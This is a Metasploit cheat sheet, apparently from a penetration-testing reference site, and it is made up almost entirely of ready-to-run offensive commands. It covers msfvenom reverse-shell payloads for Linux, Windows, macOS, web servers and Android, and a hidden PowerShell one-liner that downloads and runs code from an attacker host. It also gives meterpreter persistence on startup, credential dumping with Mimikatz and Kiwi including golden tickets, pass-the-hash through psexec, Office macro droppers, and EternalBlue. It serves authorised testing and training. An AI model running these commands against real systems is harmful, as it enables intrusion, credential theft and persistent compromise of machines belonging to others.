---
title: Metasploit
date: 2022-11-22 12:05:24
icon: icon-metasploit-framework-logo
background: bg-sky-600
tags:
    - recon
    - port scan
    - path fuzzing
categories:
    - Persistence
intro: |
    Metasploit CheatSheet
---

## Installation {.cols-2}

### shell

```shell script {.wrap}
$ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall 
$ chmod 755 msfinstall 
$ ./msfinstall
```

### docker

```shell script {.wrap}
$ sudo docker run --rm -it -p 443:443 -v ~/.msf4:/root/.msf4 -v /tmp/msf:/tmp/data remnux/metasploit
```

## Sessions {.cols-1}

### Sessions command

| Shortcuts                                                                                | Description                           |
|:-----------------------------------------------------------------------------------------|:--------------------------------------|
| `Ctrl+Z`                                                                                 | Session in Background                 |
| sessions                                                                                 | List sessions                         |
| sessions -i \<number\>                                                                   | Interact with Session with id         |
| sessions -u \<number\>                                                                   | Upgrade session to a meterpreter      |
| sessions -u \<number\> LPORT=4444 PAYLOAD_OVERRIDE=meterpreter/reverse_tcp HANDLER=false | Upgrade session to a meterpreter      |
| sessions -c cmd                                                                          | Execute a command on several sessions |
| sessions -i 10-20 -c "id"                                                                | Execute a command on several sessions |
{.shortcuts}

## Background {.cols-1}

### Background handler

ExitOnSession : the handler will not exit if the meterpreter dies.

```shell script
$ sudo msfconsole

msf> use exploit/multi/handler
msf> set PAYLOAD generic/shell_reverse_tcp
msf> set LHOST 0.0.0.0
msf> set LPORT 4444
msf> set ExitOnSession false

msf> generate -o /tmp/meterpreter.exe -f exe
msf> to_handler
```

## Basic msfvenom {.cols-1}

### Generate a meterpreter

```shell script
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f elf > shell.elf
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f exe > shell.exe
$ msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f macho > shell.macho
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f asp > shell.asp
$ msfvenom -p php/meterpreter_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw -o shell.php
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw > shell.jsp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f war > shell.war
$ msfvenom -p cmd/unix/reverse_python LHOST="10.10.10.110" LPORT=4242 -f raw > shell.py
$ msfvenom -p cmd/unix/reverse_bash LHOST="10.10.10.110" LPORT=4242 -f raw > shell.sh
$ msfvenom -p cmd/unix/reverse_perl LHOST="10.10.10.110" LPORT=4242 -f raw > shell.pl
$ msfvenom --platform android -p android/meterpreter/reverse_tcp lhost="10.10.10.110" lport=4242 R -o malicious.apk
```

## Basic handler {.cols-2}

### Meterpreter Webdelivery

Set up a Powershell web delivery listening on port 8080.

```shell script {.wrap}
msf> use exploit/multi/script/web_delivery
msf> set TARGET 2
msf> set payload windows/x64/meterpreter/reverse_http
msf> set LHOST 10.0.0.1
msf> set LPORT 4444
msf> run
```

Powershell Run

```shell script {.wrap}
powershell.exe -nop -w hidden -c $g=new-object net.webclient;$g.proxy=[Net.WebRequest]::GetSystemWebProxy();$g.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $g.downloadstring('http://10.0.0.1:8080/0x010101');
```


### Get System

Get System testing

```powershell {.wrap}
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Persistence Startup

```shell script
meterpreter> run persistence -U -p 4242
```

OPTIONS:

```shell script {.wrap}
-A        Automatically start a matching exploit/multi/handler to connect to the agent
-L <opt>  Location in target host to write payload to, if none %TEMP% will be used.
-P <opt>  Payload to use, default is windows/meterpreter/reverse_tcp.
-S        Automatically start the agent on boot as a service (with SYSTEM privileges)
-T <opt>  Alternate executable template to use
-U        Automatically start the agent when the User logs on
-X        Automatically start the agent when the system boots
-h        This help menu
-i <opt>  The interval in seconds between each connection attempt
-p <opt>  The port on which the system running Metasploit is listening
-r <opt>  The IP of the system running Metasploit listening for the connect back
```


### Network Monitoring 

interfaces Mode

```shell script {.wrap}
# list interfaces
meterpreter> run packetrecorder -li

# record interface n°1
meterpreter> run packetrecorder -i 1
```

### Portforward

portfwd Mode

```shell script {.wrap}
meterpreter> portfwd add -l 7777 -r 172.17.0.2 -p 3006
```

### Upload / Download

file transfer

```shell script {.wrap}
upload /path/in/hdd/payload.exe exploit.exe
download /path/in/victim
```

### Execute from Memory

Overwrite the memory space in this process with the program we want to execute.

```shell script {.wrap}
meterpreter> execute -H -i -c -m -d calc.exe -f /root/wce.exe -a  -w
```

### Mimikatz Mode

Metasploit offers Mimikatz and Kiwi extensions to perform various types of credential-oriented operations, such as dumping passwords and hashes, dumping passwords in memory, generating golden tickets, and much more.

Mimikatz

```shell script {.wrap}
meterpreter> load mimikatz
meterpreter> mimikatz_command -f version
meterpreter> mimikatz_command -f samdump::hashes
meterpreter> mimikatz_command -f sekurlsa::wdigest
meterpreter> mimikatz_command -f sekurlsa::searchPasswords
meterpreter> mimikatz_command -f sekurlsa::logonPasswords full
```

Kiwi

```shell script {.wrap}
meterpreter> load kiwi
meterpreter> creds_all
meterpreter> golden_ticket_create -d <domainname> -k <nthashof krbtgt> -s <SID without le RID> -u <user_for_the_ticket> -t <location_to_store_tck>
```

### PSExec

Pass the Hash

```shell script {.wrap}
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
msf exploit(psexec) > exploit
SMBDomain             WORKGROUP                             no        The Windows domain to use for authentication
SMBPass               598ddce...b51404ee:2d20d...1d93985bf  no        The password for the specified username
SMBUser               0x584a                                no        The username to authenticate as
```

### Use SOCKS Proxy

Set proxy

```shell script
setg Proxies socks4:127.0.0.1:1080
```

## Scripting Metasploit {.cols-1}

### Office macro

Using a `.rc file`, write the commands to execute, then run `msfconsole -r ./file.rc`.  Here is a simple example to script the deployment of a handler an create an Office doc with macro.

```shell script {.wrap}
msf> use exploit/multi/handler
msf> set PAYLOAD windows/meterpreter/reverse_https
msf> set LHOST 0.0.0.0
msf> set LPORT 4646
msf> set ExitOnSession false
msf> exploit -j -z


msf> use exploit/multi/fileformat/office_word_macro 
msf> set PAYLOAD windows/meterpreter/reverse_https
msf> set LHOST 10.10.14.22
msf> set LPORT 4646
msf> exploit
```

## Best of - Exploits

* MS17-10 Eternal Blue - `exploit/windows/smb/ms17_010_eternalblue`
* MS08_67 - `exploit/windows/smb/ms08_067_netapi`


Also see
-------

* [Multiple transports in a meterpreter payload - ionize](https://ionize.com.au/multiple-transports-in-a-meterpreter-payload/)
* [Creating Metasploit Payloads - Peleus](https://netsec.ws/?p=331)